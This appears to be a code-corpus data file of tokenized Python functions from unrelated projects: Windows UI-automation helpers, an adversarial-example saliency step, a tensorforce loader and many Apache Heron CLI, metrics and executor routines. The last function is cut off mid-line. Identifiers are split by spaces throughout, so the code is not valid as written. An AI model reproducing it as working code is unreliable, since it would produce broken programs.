def from config ( config , kwargs = None ) : return util . get object ( obj = config , predefined = tensorforce . core . optimizers . solvers . solvers , kwargs = kwargs )
def Set Clipboard Text ( text : str ) -> bool : if ctypes . windll . user32 . Open Clipboard ( 0 ) : ctypes . windll . user32 . Empty Clipboard ( ) text Byte Len = ( len ( text ) + 1 ) * 2 h Clipboard Data = ctypes . windll . kernel32 . Global Alloc ( 0 , text Byte Len ) # GMEM FIXED=0 h Dest Text = ctypes . windll . kernel32 . Global Lock ( h Clipboard Data ) ctypes . cdll . msvcrt . wcsncpy ( ctypes . c wchar p ( h Dest Text ) , ctypes . c wchar p ( text ) , text Byte Len // 2 ) ctypes . windll . kernel32 . Global Unlock ( h Clipboard Data ) # system owns h Clipboard Data after calling Set Clipboard Data, # application can not write to or free the data once ownership has been transferred to the system ctypes . windll . user32 . Set Clipboard Data ( 13 , h Clipboard Data ) # CF TEXT=1, CF UNICODETEXT=13 ctypes . windll . user32 . Close Clipboard ( ) return True return False
def mouse event ( dw Flags : int , dx : int , dy : int , dw Data : int , dw Extra Info : int ) -> None : ctypes . windll . user32 . mouse event ( dw Flags , dx , dy , dw Data , dw Extra Info )
def keybd event ( b Vk : int , b Scan : int , dw Flags : int , dw Extra Info : int ) -> None : ctypes . windll . user32 . keybd event ( b Vk , b Scan , dw Flags , dw Extra Info )
def Keyboard Input ( w Vk : int , w Scan : int , dw Flags : int = Keyboard Event Flag . Key Down , time : int = 0 ) -> INPUT : return Create Input ( KEYBDINPUT ( w Vk , w Scan , dw Flags , time , None ) )
def Hardware Input ( u Msg : int , param : int = 0 ) -> INPUT : return Create Input ( HARDWAREINPUT ( u Msg , param & 0x FFFF , param >> 16 & 0x FFFF ) )
def Delete Log ( ) -> None : if os . path . exists ( Logger . File Name ) : os . remove ( Logger . File Name )
def Get All Pixel Colors ( self ) -> ctypes . Array : return self . Get Pixel Colors Of Rect ( 0 , 0 , self . Width , self . Height )
def Get Parent Control ( self ) -> 'Control' : ele = Automation Client . instance ( ) . View Walker . Get Parent Element ( self . Element ) return Control . Create Control From Element ( ele )
def Get First Child Control ( self ) -> 'Control' : ele = Automation Client . instance ( ) . View Walker . Get First Child Element ( self . Element ) return Control . Create Control From Element ( ele )
def Get Last Child Control ( self ) -> 'Control' : ele = Automation Client . instance ( ) . View Walker . Get Last Child Element ( self . Element ) return Control . Create Control From Element ( ele )
def Get Next Sibling Control ( self ) -> 'Control' : ele = Automation Client . instance ( ) . View Walker . Get Next Sibling Element ( self . Element ) return Control . Create Control From Element ( ele )
def Get Previous Sibling Control ( self ) -> 'Control' : ele = Automation Client . instance ( ) . View Walker . Get Previous Sibling Element ( self . Element ) return Control . Create Control From Element ( ele )
def Get Children ( self ) -> list : children = [ ] child = self . Get First Child Control ( ) while child : children . append ( child ) child = child . Get Next Sibling Control ( ) return children
def Set Window Text ( self , text : str ) -> bool : handle = self . Native Window Handle if handle : return Set Window Text ( handle , text ) return False
def Is Top Level ( self ) -> bool : handle = self . Native Window Handle if handle : return Get Ancestor ( handle , GA Flag . Root ) == handle return False
def Maximize ( self , wait Time : float = OPERATION WAIT TIME ) -> bool : if self . Is Top Level ( ) : return self . Show Window ( SW . Show Maximized , wait Time ) return False
def Move To Center ( self ) -> bool : if self . Is Top Level ( ) : rect = self . Bounding Rectangle screen Width , screen Height = Get Screen Size ( ) x , y = ( screen Width - rect . width ( ) ) // 2 , ( screen Height - rect . height ( ) ) // 2 if x < 0 : x = 0 if y < 0 : y = 0 return Set Window Pos ( self . Native Window Handle , SWP . HWND Top , x , y , 0 , 0 , SWP . SWP No Size ) return False
def Set Active ( self , wait Time : float = OPERATION WAIT TIME ) -> bool : if self . Is Top Level ( ) : handle = self . Native Window Handle if Is Iconic ( handle ) : ret = Show Window ( handle , SW . Restore ) elif not Is Window Visible ( handle ) : ret = Show Window ( handle , SW . Show ) ret = Set Foreground Window ( handle ) # may fail if foreground windows's process is not python time . sleep ( wait Time ) return ret return False
def saliency map ( self , a , image , target , labels , mask , fast = False ) : # pixel influence on target class alphas = a . gradient ( image , target ) * mask # pixel influence on sum of residual classes # (don't evaluate if fast == True) if fast : betas = - np . ones like ( alphas ) else : betas = np . sum ( [ a . gradient ( image , label ) * mask - alphas for label in labels ] , 0 ) # compute saliency map # (take into account both pos. & neg. perturbations) salmap = np . abs ( alphas ) * np . abs ( betas ) * np . sign ( alphas * betas ) # find optimal pixel & direction of perturbation idx = np . argmin ( salmap ) idx = np . unravel index ( idx , mask . shape ) pix sign = np . sign ( alphas ) [ idx ] return idx , pix sign
def get output ( self , a , image ) : sd = np . square ( self . input images - image ) mses = np . mean ( sd , axis = tuple ( range ( 1 , sd . ndim ) ) ) index = np . argmin ( mses ) # if we run into numerical problems with this approach, we might # need to add a very tiny threshold here if mses [ index ] > 0 : raise Value Error ( 'No precomputed output image for this image' ) return self . output images [ index ]
def write error response ( self , message ) : self . set status ( 404 ) response = self . make error response ( str ( message ) ) now = time . time ( ) spent = now - self . basehandler starttime response [ constants . RESPONSE KEY EXECUTION TIME ] = spent self . write json response ( response )
def write json response ( self , response ) : self . write ( tornado . escape . json encode ( response ) ) self . set header ( "Content-Type" , "application/json" )
def create tar ( tar filename , files , config dir , config files ) : with contextlib . closing ( tarfile . open ( tar filename , 'w:gz' , dereference = True ) ) as tar : for filename in files : if os . path . isfile ( filename ) : tar . add ( filename , arcname = os . path . basename ( filename ) ) else : raise Exception ( "%s is not an existing file" % filename ) if os . path . isdir ( config dir ) : tar . add ( config dir , arcname = get heron sandbox conf dir ( ) ) else : raise Exception ( "%s is not an existing directory" % config dir ) for filename in config files : if os . path . isfile ( filename ) : arcfile = os . path . join ( get heron sandbox conf dir ( ) , os . path . basename ( filename ) ) tar . add ( filename , arcname = arcfile ) else : raise Exception ( "%s is not an existing file" % filename )
def get subparser ( parser , command ) : # pylint: disable=protected-access subparsers actions = [ action for action in parser . actions if isinstance ( action , argparse . Sub Parsers Action ) ] # there will probably only be one subparser action, # but better save than sorry for subparsers action in subparsers actions : # get all subparsers for choice , subparser in subparsers action . choices . items ( ) : if choice == command : return subparser return None
def get heron libs ( local jars ) : heron lib dir = get heron lib dir ( ) heron libs = [ os . path . join ( heron lib dir , f ) for f in local jars ] return heron libs
def parse override config ( namespace ) : overrides = dict ( ) for config in namespace : kv = config . split ( "=" ) if len ( kv ) != 2 : raise Exception ( "Invalid config property format (%s) expected key=value" % config ) if kv [ 1 ] in [ 'true' , 'True' , 'TRUE' ] : overrides [ kv [ 0 ] ] = True elif kv [ 1 ] in [ 'false' , 'False' , 'FALSE' ] : overrides [ kv [ 0 ] ] = False else : overrides [ kv [ 0 ] ] = kv [ 1 ] return overrides
def get java path ( ) : java home = os . environ . get ( "JAVA HOME" ) return os . path . join ( java home , BIN DIR , "java" )
def check java home set ( ) : # check if environ variable is set if "JAVA HOME" not in os . environ : Log . error ( "JAVA HOME not set" ) return False # check if the value set is correct java path = get java path ( ) if os . path . isfile ( java path ) and os . access ( java path , os . X OK ) : return True Log . error ( "JAVA HOME/bin/java either does not exist or not an executable" ) return False
def check release file exists ( ) : release file = get heron release file ( ) # if the file does not exist and is not a file if not os . path . isfile ( release file ) : Log . error ( "Required file not found: %s" % release file ) return False return True
def unregister watch ( self , uid ) : # Do not raise an error if UUID is # not present in the watches. Log . info ( "Unregister a watch with uid: " + str ( uid ) ) self . watches . pop ( uid , None )
def num instances ( self ) : num = 0 # Get all the components components = self . spouts ( ) + self . bolts ( ) # Get instances for each worker for component in components : config = component . comp . config for kvs in config . kvs : if kvs . key == api constants . TOPOLOGY COMPONENT PARALLELISM : num += int ( kvs . value ) break return num
def convert pb kvs ( kvs , include non primitives = True ) : config = { } for kv in kvs : if kv . value : config [ kv . key ] = kv . value elif kv . serialized value : # add serialized value support for python values (fixme) # is this a serialized java object if topology pb2 . JAVA SERIALIZED VALUE == kv . type : jv = convert java value ( kv , include non primitives = include non primitives ) if jv is not None : config [ kv . key ] = jv else : config [ kv . key ] = raw value ( kv ) return config
def synch topologies ( self ) : self . state managers = statemanagerfactory . get all state managers ( self . config . statemgr config ) try : for state manager in self . state managers : state manager . start ( ) except Exception as ex : Log . error ( "Found exception while initializing state managers: %s. Bailing out..." % ex ) traceback . print exc ( ) sys . exit ( 1 ) # pylint: disable=deprecated-lambda def on topologies watch ( state manager , topologies ) : """watch topologies""" Log . info ( "State watch triggered for topologies." ) Log . debug ( "Topologies: " + str ( topologies ) ) existing Topologies = self . get Topologies For State Location ( state manager . name ) existing Top Names = map ( lambda t : t . name , existing Topologies ) Log . debug ( "Existing topologies: " + str ( existing Top Names ) ) for name in existing Top Names : if name not in topologies : Log . info ( "Removing topology: %s in rootpath: %s" , name , state manager . rootpath ) self . remove Topology ( name , state manager . name ) for name in topologies : if name not in existing Top Names : self . add New Topology ( state manager , name ) for state manager in self . state managers : # The callback function with the bound # state manager as first variable. on Topologies Watch = partial ( on topologies watch , state manager ) state manager . get topologies ( on Topologies Watch )
def get Topologies For State Location ( self , name ) : return filter ( lambda t : t . state manager name == name , self . topologies )
def remove Topology ( self , topology name , state manager name ) : topologies = [ ] for top in self . topologies : if ( top . name == topology name and top . state manager name == state manager name ) : # Remove topology Info if ( topology name , state manager name ) in self . topology Infos : self . topology Infos . pop ( ( topology name , state manager name ) ) else : topologies . append ( top ) self . topologies = topologies
def validated formatter ( self , url format ) : # We try to create a string by substituting all known # parameters. If an unknown parameter is present, an error # will be thrown valid parameters = { "${CLUSTER}" : "cluster" , "${ENVIRON}" : "environ" , "${TOPOLOGY}" : "topology" , "${ROLE}" : "role" , "${USER}" : "user" , } dummy formatted url = url format for key , value in valid parameters . items ( ) : dummy formatted url = dummy formatted url . replace ( key , value ) # All $ signs must have been replaced if '$' in dummy formatted url : raise Exception ( "Invalid viz.url.format: %s" % ( url format ) ) # No error is thrown, so the format is valid. return url format
def to table ( components , topo info ) : inputs , outputs = defaultdict ( list ) , defaultdict ( list ) for ctype , component in components . items ( ) : if ctype == 'bolts' : for component name , component info in component . items ( ) : for input stream in component info [ 'inputs' ] : input name = input stream [ 'component name' ] inputs [ component name ] . append ( input name ) outputs [ input name ] . append ( component name ) info = [ ] spouts instance = topo info [ 'physical plan' ] [ 'spouts' ] bolts instance = topo info [ 'physical plan' ] [ 'bolts' ] for ctype , component in components . items ( ) : # stages is an int so keep going if ctype == "stages" : continue for component name , component info in component . items ( ) : row = [ ctype [ : - 1 ] , component name ] if ctype == 'spouts' : row . append ( len ( spouts instance [ component name ] ) ) else : row . append ( len ( bolts instance [ component name ] ) ) row . append ( ',' . join ( inputs . get ( component name , [ '-' ] ) ) ) row . append ( ',' . join ( outputs . get ( component name , [ '-' ] ) ) ) info . append ( row ) header = [ 'type' , 'name' , 'parallelism' , 'input' , 'output' ] return info , header
def filter bolts ( table , header ) : bolts info = [ ] for row in table : if row [ 0 ] == 'bolt' : bolts info . append ( row ) return bolts info , header
def filter spouts ( table , header ) : spouts info = [ ] for row in table : if row [ 0 ] == 'spout' : spouts info . append ( row ) return spouts info , header
def validate state locations ( self ) : names = map ( lambda loc : loc [ "name" ] , self . locations ) assert len ( names ) == len ( set ( names ) ) , "Names of state locations must be unique"
def initialize ( self , config , context ) : self . logger . info ( "Initializing Pulsar Spout with the following" ) self . logger . info ( "Component-specific config: \n%s" % str ( config ) ) self . logger . info ( "Context: \n%s" % str ( context ) ) self . emit count = 0 self . ack count = 0 self . fail count = 0 if not Pulsar Spout . service Url in config or not Pulsar Spout . topic Name in config : self . logger . fatal ( "Need to specify both service Url and topic Name" ) self . pulsar cluster = str ( config [ Pulsar Spout . service Url ] ) self . topic = str ( config [ Pulsar Spout . topic Name ] ) mode = config [ api constants . TOPOLOGY RELIABILITY MODE ] if mode == api constants . Topology Reliability Mode . ATLEAST ONCE : self . acking timeout = 1000 * int ( config [ api constants . TOPOLOGY MESSAGE TIMEOUT SECS ] ) else : self . acking timeout = 30000 if Pulsar Spout . receive Timeout Ms in config : self . receive timeout ms = config [ Pulsar Spout . receive Timeout Ms ] else : self . receive timeout ms = 10 if Pulsar Spout . deserializer in config : self . deserializer = config [ Pulsar Spout . deserializer ] if not callable ( self . deserializer ) : self . logger . fatal ( "Pulsar Message Deserializer needs to be callable" ) else : self . deserializer = self . default deserializer # First generate the config self . log Conf File Name = Generate Log Config ( context ) self . logger . info ( "Generated Log Conf at %s" % self . log Conf File Name ) # We currently use the high level consumer API # For supporting effectively once, we will need to switch # to using lower level Reader API, when it becomes # available in python self . client = pulsar . Client ( self . pulsar cluster , log conf file path = self . log Conf File Name ) self . logger . info ( "Setup Client with cluster %s" % self . pulsar cluster ) try : self . consumer = self . client . subscribe ( self . topic , context . get topology name ( ) , consumer type = pulsar . Consumer Type . Failover , unacked messages timeout ms = self . acking timeout ) except Exception as e : self . logger . fatal ( "Pulsar client subscription failed: %s" % str ( e ) ) self . logger . info ( "Subscribed to topic %s" % self . topic )
def get Instance Jstack ( self , topology info , instance id ) : pid response = yield get Instance Pid ( topology info , instance id ) try : http client = tornado . httpclient . Async HTTP Client ( ) pid json = json . loads ( pid response ) pid = pid json [ 'stdout' ] . strip ( ) if pid == '' : raise Exception ( 'Failed to get pid' ) endpoint = utils . make shell endpoint ( topology info , instance id ) url = "%s/jstack/%s" % ( endpoint , pid ) response = yield http client . fetch ( url ) Log . debug ( "HTTP call for url: %s" , url ) raise tornado . gen . Return ( response . body ) except tornado . httpclient . HTTP Error as e : raise Exception ( str ( e ) )
def create parser ( subparsers ) : parser = subparsers . add parser ( 'update' , help = 'Update a topology' , usage = "%(prog)s [options] cluster/[role]/[env] <topology-name> " + "[--component-parallelism <name:value>] " + "[--container-number value] " + "[--runtime-config [component:]<name:value>]" , add help = True ) args . add titles ( parser ) args . add cluster role env ( parser ) args . add topology ( parser ) args . add config ( parser ) args . add dry run ( parser ) args . add service url ( parser ) args . add verbose ( parser ) # Special parameters for update command def parallelism type ( value ) : pattern = re . compile ( r"^[\w\.-]+:[\d]+$" ) if not pattern . match ( value ) : raise argparse . Argument Type Error ( "Invalid syntax for component parallelism (<component name:value>): %s" % value ) return value parser . add argument ( '--component-parallelism' , action = 'append' , type = parallelism type , required = False , help = 'Component name and the new parallelism value ' + 'colon-delimited: <component name>:<parallelism>' ) def runtime config type ( value ) : pattern = re . compile ( r"^([\w\.-]+:){1,2}[\w\.-]+$" ) if not pattern . match ( value ) : raise argparse . Argument Type Error ( "Invalid syntax for runtime config ([component:]<name:value>): %s" % value ) return value parser . add argument ( '--runtime-config' , action = 'append' , type = runtime config type , required = False , help = 'Runtime configurations for topology and components ' + 'colon-delimited: [component:]<name>:<value>' ) def container number type ( value ) : pattern = re . compile ( r"^\d+$" ) if not pattern . match ( value ) : raise argparse . Argument Type Error ( "Invalid syntax for container number (value): %s" % value ) return value parser . add argument ( '--container-number' , action = 'append' , type = container number type , required = False , help = 'Number of containers <value>' ) parser . set defaults ( subcommand = 'update' ) return parser
def build extra args dict ( cl args ) : # Check parameters component parallelism = cl args [ 'component parallelism' ] runtime configs = cl args [ 'runtime config' ] container number = cl args [ 'container number' ] # Users need to provide either (component-parallelism || container number) or runtime-config if ( component parallelism and runtime configs ) or ( container number and runtime configs ) : raise Exception ( "(component-parallelism or container num) and runtime-config " + "can't be updated at the same time" ) dict extra args = { } nothing set = True if component parallelism : dict extra args . update ( { 'component parallelism' : component parallelism } ) nothing set = False if container number : dict extra args . update ( { 'container number' : container number } ) nothing set = False if runtime configs : dict extra args . update ( { 'runtime config' : runtime configs } ) nothing set = False if nothing set : raise Exception ( "Missing arguments --component-parallelism or --runtime-config or --container-number" ) if cl args [ 'dry run' ] : dict extra args . update ( { 'dry run' : True } ) if 'dry run format' in cl args : dict extra args . update ( { 'dry run format' : cl args [ "dry run format" ] } ) return dict extra args
def run ( command , parser , cl args , unknown args ) : Log . debug ( "Update Args: %s" , cl args ) # Build jar list extra lib jars = jars . packing jars ( ) action = "update topology%s" % ( ' in dry-run mode' if cl args [ "dry run" ] else '' ) # Build extra args dict extra args = { } try : dict extra args = build extra args dict ( cl args ) except Exception as err : return Simple Result ( Status . Invocation Error , err . message ) # Execute if cl args [ 'deploy mode' ] == config . SERVER MODE : return cli helper . run server ( command , cl args , action , dict extra args ) else : # Convert extra argument to commandline format and then execute list extra args = convert args dict to list ( dict extra args ) return cli helper . run direct ( command , cl args , action , list extra args , extra lib jars )
def is grouping sane ( cls , gtype ) : if gtype == cls . SHUFFLE or gtype == cls . ALL or gtype == cls . LOWEST or gtype == cls . NONE : return True elif isinstance ( gtype , cls . FIELDS ) : return gtype . gtype == topology pb2 . Grouping . Value ( "FIELDS" ) and gtype . fields is not None elif isinstance ( gtype , cls . CUSTOM ) : return gtype . gtype == topology pb2 . Grouping . Value ( "CUSTOM" ) and gtype . python serialized is not None else : #pylint: disable=fixme #TODO: DIRECT are not supported yet return False
def register metrics ( self , metrics collector , interval ) : for field , metrics in self . metrics . items ( ) : metrics collector . register metric ( field , metrics , interval )
def update received packet ( self , received pkt size bytes ) : self . update count ( self . RECEIVED PKT COUNT ) self . update count ( self . RECEIVED PKT SIZE , incr by = received pkt size bytes )
def update sent packet ( self , sent pkt size bytes ) : self . update count ( self . SENT PKT COUNT ) self . update count ( self . SENT PKT SIZE , incr by = sent pkt size bytes )
def serialize data tuple ( self , stream id , latency in ns ) : self . update count ( self . TUPLE SERIALIZATION TIME NS , incr by = latency in ns , key = stream id )
def init multi count metrics ( self , pplan helper ) : to init = [ self . metrics [ i ] for i in self . to multi init if i in self . metrics and isinstance ( self . metrics [ i ] , Multi Count Metric ) ] for out stream in pplan helper . get my spout ( ) . outputs : stream id = out stream . stream . id for metric in to init : metric . add key ( stream id )
def next tuple ( self , latency in ns ) : self . update reduced metric ( self . NEXT TUPLE LATENCY , latency in ns ) self . update count ( self . NEXT TUPLE COUNT )
def acked tuple ( self , stream id , complete latency ns ) : self . update count ( self . ACK COUNT , key = stream id ) self . update reduced metric ( self . COMPLETE LATENCY , complete latency ns , key = stream id )
def failed tuple ( self , stream id , fail latency ns ) : self . update count ( self . FAIL COUNT , key = stream id ) self . update reduced metric ( self . FAIL LATENCY , fail latency ns , key = stream id )
def init multi count metrics ( self , pplan helper ) : # inputs to in init = [ self . metrics [ i ] for i in self . inputs init if i in self . metrics and isinstance ( self . metrics [ i ] , Multi Count Metric ) ] for in stream in pplan helper . get my bolt ( ) . inputs : stream id = in stream . stream . id global stream id = in stream . stream . component name + "/" + stream id for metric in to in init : metric . add key ( stream id ) metric . add key ( global stream id ) # outputs to out init = [ self . metrics [ i ] for i in self . outputs init if i in self . metrics and isinstance ( self . metrics [ i ] , Multi Count Metric ) ] for out stream in pplan helper . get my bolt ( ) . outputs : stream id = out stream . stream . id for metric in to out init : metric . add key ( stream id )
def execute tuple ( self , stream id , source component , latency in ns ) : self . update count ( self . EXEC COUNT , key = stream id ) self . update reduced metric ( self . EXEC LATENCY , latency in ns , stream id ) self . update count ( self . EXEC TIME NS , incr by = latency in ns , key = stream id ) global stream id = source component + "/" + stream id self . update count ( self . EXEC COUNT , key = global stream id ) self . update reduced metric ( self . EXEC LATENCY , latency in ns , global stream id ) self . update count ( self . EXEC TIME NS , incr by = latency in ns , key = global stream id )
def deserialize data tuple ( self , stream id , source component , latency in ns ) : self . update count ( self . TUPLE DESERIALIZATION TIME NS , incr by = latency in ns , key = stream id ) global stream id = source component + "/" + stream id self . update count ( self . TUPLE DESERIALIZATION TIME NS , incr by = latency in ns , key = global stream id )
def acked tuple ( self , stream id , source component , latency in ns ) : self . update count ( self . ACK COUNT , key = stream id ) self . update reduced metric ( self . PROCESS LATENCY , latency in ns , stream id ) global stream id = source component + '/' + stream id self . update count ( self . ACK COUNT , key = global stream id ) self . update reduced metric ( self . PROCESS LATENCY , latency in ns , global stream id )
def failed tuple ( self , stream id , source component , latency in ns ) : self . update count ( self . FAIL COUNT , key = stream id ) self . update reduced metric ( self . FAIL LATENCY , latency in ns , stream id ) global stream id = source component + '/' + stream id self . update count ( self . FAIL COUNT , key = global stream id ) self . update reduced metric ( self . FAIL LATENCY , latency in ns , global stream id )
def parse ( version ) : match = REGEX . match ( version ) if match is None : raise Value Error ( '%s is not valid Sem Ver string' % version ) verinfo = match . groupdict ( ) verinfo [ 'major' ] = int ( verinfo [ 'major' ] ) verinfo [ 'minor' ] = int ( verinfo [ 'minor' ] ) verinfo [ 'patch' ] = int ( verinfo [ 'patch' ] ) return verinfo
def get all file state managers ( conf ) : state managers = [ ] state locations = conf . get state locations of type ( "file" ) for location in state locations : name = location [ 'name' ] rootpath = os . path . expanduser ( location [ 'rootpath' ] ) LOG . info ( "Connecting to file state with rootpath: " + rootpath ) state manager = File State Manager ( name , rootpath ) state managers . append ( state manager ) return state managers
def incr ( self , key , to add = 1 ) : if key not in self . value : self . value [ key ] = Count Metric ( ) self . value [ key ] . incr ( to add )
def update ( self , key , value ) : if key not in self . value : self . value [ key ] = Reduced Metric ( self . reducer ) self . value [ key ] . update ( value )
def add key ( self , key ) : if key not in self . value : self . value [ key ] = Reduced Metric ( self . reducer )
def add data tuple ( self , stream id , new data tuple , tuple size in bytes ) : if ( self . current data tuple set is None ) or ( self . current data tuple set . stream . id != stream id ) or ( len ( self . current data tuple set . tuples ) >= self . data tuple set capacity ) or ( self . current data tuple size in bytes >= self . max data tuple size in bytes ) : self . init new data tuple ( stream id ) added tuple = self . current data tuple set . tuples . add ( ) added tuple . Copy From ( new data tuple ) self . current data tuple size in bytes += tuple size in bytes self . total data emitted in bytes += tuple size in bytes
def valid path ( path ) : # check if the suffic of classpath suffix exists as directory if path . endswith ( '*' ) : Log . debug ( 'Checking classpath entry suffix as directory: %s' , path [ : - 1 ] ) if os . path . isdir ( path [ : - 1 ] ) : return True return False # check if the classpath entry is a directory Log . debug ( 'Checking classpath entry as directory: %s' , path ) if os . path . isdir ( path ) : return True else : # check if the classpath entry is a file Log . debug ( 'Checking classpath entry as file: %s' , path ) if os . path . isfile ( path ) : return True return False
def valid java classpath ( classpath ) : paths = classpath . split ( ':' ) for path entry in paths : if not valid path ( path entry . strip ( ) ) : return False return True
def load pex ( path to pex , include deps = True ) : abs path to pex = os . path . abspath ( path to pex ) Log . debug ( "Add a pex to the path: %s" % abs path to pex ) if abs path to pex not in sys . path : sys . path . insert ( 0 , os . path . dirname ( abs path to pex ) ) # add dependencies to path if include deps : for dep in get deps list ( abs path to pex ) : to join = os . path . join ( os . path . dirname ( abs path to pex ) , dep ) if to join not in sys . path : Log . debug ( "Add a new dependency to the path: %s" % dep ) sys . path . insert ( 0 , to join ) Log . debug ( "Python path: %s" % str ( sys . path ) )
def new source ( self , source ) : source streamlet = None if callable ( source ) : source streamlet = Supplier Streamlet ( source ) elif isinstance ( source , Generator ) : source streamlet = Generator Streamlet ( source ) else : raise Runtime Error ( "Builder's new source has to be either a Generator or a function" ) self . sources . append ( source streamlet ) return source streamlet
def build ( self , bldr ) : stage names = sets . Set ( ) for source in self . sources : source . build ( bldr , stage names ) for source in self . sources : if not source . all built ( ) : raise Runtime Error ( "Topology cannot be fully built! Are all sources added?" )
def replace ( config , wildcards , config file ) : for config key in config : config value = config [ config key ] original value = config value if isinstance ( config value , str ) : for token in wildcards : if wildcards [ token ] : config value = config value . replace ( token , wildcards [ token ] ) found = re . findall ( r'\${[A-Z ]+}' , config value ) if found : raise Value Error ( "%s=%s in file %s contains unsupported or unset wildcard tokens: %s" % ( config key , original value , config file , ", " . join ( found ) ) ) config [ config key ] = config value return config
def get command handlers ( ) : return { 'activate' : activate , 'config' : hconfig , 'deactivate' : deactivate , 'help' : cli help , 'kill' : kill , 'restart' : restart , 'submit' : submit , 'update' : update , 'version' : version }
def initialize ( self , config , context ) : if Sliding Window Bolt . WINDOW DURATION SECS in config : self . window duration = int ( config [ Sliding Window Bolt . WINDOW DURATION SECS ] ) else : self . logger . fatal ( "Window Duration has to be specified in the config" ) if Sliding Window Bolt . WINDOW SLIDEINTERVAL SECS in config : self . slide interval = int ( config [ Sliding Window Bolt . WINDOW SLIDEINTERVAL SECS ] ) else : self . slide interval = self . window duration if self . slide interval > self . window duration : self . logger . fatal ( "Slide Interval should be <= Window Duration" ) # By modifying the config, we are able to setup the tick timer config [ api constants . TOPOLOGY TICK TUPLE FREQ SECS ] = str ( self . slide interval ) self . current tuples = deque ( ) if hasattr ( self , 'saved state' ) : if 'tuples' in self . saved state : self . current tuples = self . saved state [ 'tuples' ]
def initialize ( self , config , context ) : if Tumbling Window Bolt . WINDOW DURATION SECS in config : self . window duration = int ( config [ Tumbling Window Bolt . WINDOW DURATION SECS ] ) else : self . logger . fatal ( "Window Duration has to be specified in the config" ) # By modifying the config, we are able to setup the tick timer config [ api constants . TOPOLOGY TICK TUPLE FREQ SECS ] = str ( self . window duration ) self . current tuples = deque ( ) if hasattr ( self , 'saved state' ) : if 'tuples' in self . saved state : self . current tuples = self . saved state [ 'tuples' ]
def get Stmgrs Reg Summary ( self , tmaster , callback = None ) : if not tmaster or not tmaster . host or not tmaster . stats port : return reg request = tmaster pb2 . Stmgrs Registration Summary Request ( ) request str = reg request . Serialize To String ( ) port = str ( tmaster . stats port ) host = tmaster . host url = "http://{0}:{1}/stmgrsregistrationsummary" . format ( host , port ) request = tornado . httpclient . HTTP Request ( url , body = request str , method = 'POST' , request timeout = 5 ) Log . debug ( 'Making HTTP call to fetch stmgrsregistrationsummary url: %s' , url ) try : client = tornado . httpclient . Async HTTP Client ( ) result = yield client . fetch ( request ) Log . debug ( "HTTP call complete." ) except tornado . httpclient . HTTP Error as e : raise Exception ( str ( e ) ) # Check the response code - error if it is in 400s or 500s response Code = result . code if response Code >= 400 : message = "Error in getting exceptions from Tmaster, code: " + response Code Log . error ( message ) raise tornado . gen . Return ( { "message" : message } ) # Parse the response from tmaster. reg response = tmaster pb2 . Stmgrs Registration Summary Response ( ) reg response . Parse From String ( result . body ) # Send response ret = { } for stmgr in reg response . registered stmgrs : ret [ stmgr ] = True for stmgr in reg response . absent stmgrs : ret [ stmgr ] = False raise tornado . gen . Return ( ret )
def setup ( executor ) : # pylint: disable=unused-argument def signal handler ( signal to handle , frame ) : # We would do nothing here but just exit # Just catch the SIGTERM and then cleanup(), registered with atexit, would invoke Log . info ( 'signal handler invoked with signal %s' , signal to handle ) executor . stop state manager watches ( ) sys . exit ( signal to handle ) def cleanup ( ) : Log . info ( 'Executor terminated; exiting all process in executor.' ) # Kill child processes first and wait for log collection to finish for pid in executor . processes to monitor . keys ( ) : os . kill ( pid , signal . SIGTERM ) time . sleep ( 5 ) # We would not wait or check whether process spawned dead or not os . killpg ( 0 , signal . SIGTERM ) # Redirect stdout and stderr to files in append mode # The filename format is heron-executor-<container id>.stdxxx shardid = executor . shard log . configure ( logfile = 'heron-executor-%s.stdout' % shardid ) pid = os . getpid ( ) sid = os . getsid ( pid ) # POSIX prohibits the change of the process group ID of a session leader if pid <> sid : Log . info ( 'Set up process group; executor becomes leader' ) os . setpgrp ( ) # create new process group, become its leader Log . info ( 'Register the SIGTERM signal handler' ) signal . signal ( signal . SIGTERM , signal handler ) Log . info ( 'Register the atexit clean up' ) atexit . register ( cleanup )
def main ( ) : # Since Heron on YARN runs as headless users, pex compiled # binaries should be exploded into the container working # directory. In order to do this, we need to set the # PEX ROOT shell environment before forking the processes shell env = os . environ . copy ( ) shell env [ "PEX ROOT" ] = os . path . join ( os . path . abspath ( '.' ) , ".pex" ) # Instantiate the executor, bind it to signal handlers and launch it executor = Heron Executor ( sys . argv , shell env ) executor . initialize ( ) start ( executor )
def init from parsed args ( self , parsed args ) : self . shard = parsed args . shard self . topology name = parsed args . topology name self . topology id = parsed args . topology id self . topology defn file = parsed args . topology defn file self . state manager connection = parsed args . state manager connection self . state manager root = parsed args . state manager root self . state manager config file = parsed args . state manager config file self . tmaster binary = parsed args . tmaster binary self . stmgr binary = parsed args . stmgr binary self . metrics manager classpath = parsed args . metrics manager classpath self . metricscache manager classpath = parsed args . metricscache manager classpath # '=' can be parsed in a wrong way by some schedulers (aurora) hence it needs to be escaped. # It is escaped in two different ways. '(61)' is the new escaping. '&equals;' was # the original replacement but it is not friendly to bash and is causing issues. The original # escaping is still left there for reference and backward compatibility purposes (to be # removed after no topology needs it) self . instance jvm opts = base64 . b64decode ( parsed args . instance jvm opts . lstrip ( '"' ) . rstrip ( '"' ) . replace ( '(61)' , '=' ) . replace ( '&equals;' , '=' ) ) self . classpath = parsed args . classpath # Needed for Docker environments since the hostname of a docker container is the container's # id within docker, rather than the host's hostname. NOTE: this 'HOST' env variable is not # guaranteed to be set in all Docker executor environments (outside of Marathon) if is docker environment ( ) : self . master host = os . environ . get ( 'HOST' ) if 'HOST' in os . environ else socket . gethostname ( ) else : self . master host = socket . gethostname ( ) self . master port = parsed args . master port self . tmaster controller port = parsed args . tmaster controller port self . tmaster stats port = parsed args . tmaster stats port self . heron internals config file = parsed args . heron internals config file self . override config file = parsed args . override config file self . component ram map = map ( lambda x : { x . split ( ':' ) [ 0 ] : int ( x . split ( ':' ) [ 1 ] ) } , parsed args . component ram map . split ( ',' ) ) self . component ram map = functools . reduce ( lambda x , y : dict ( x . items ( ) + y . items ( ) ) , self . component ram map ) # component jvm opts in base64 itself is a base64-encoding-json-map, which is appended with # " at the start and end. It also escapes "=" to "&equals" due to aurora limitation # And the json is a map from base64-encoding-component-name to base64-encoding-jvm-options self . component jvm opts = { } # First we need to decode the base64 string back to a json map string. # '=' can be parsed in a wrong way by some schedulers (aurora) hence it needs to be escaped. # It is escaped in two different ways. '(61)' is the new escaping. '&equals;' was # the original replacement but it is not friendly to bash and is causing issues. The original # escaping is still left there for reference and backward compatibility purposes (to be # removed after no topology needs it) component jvm opts in json = base64 . b64decode ( parsed args . component jvm opts . lstrip ( '"' ) . rstrip ( 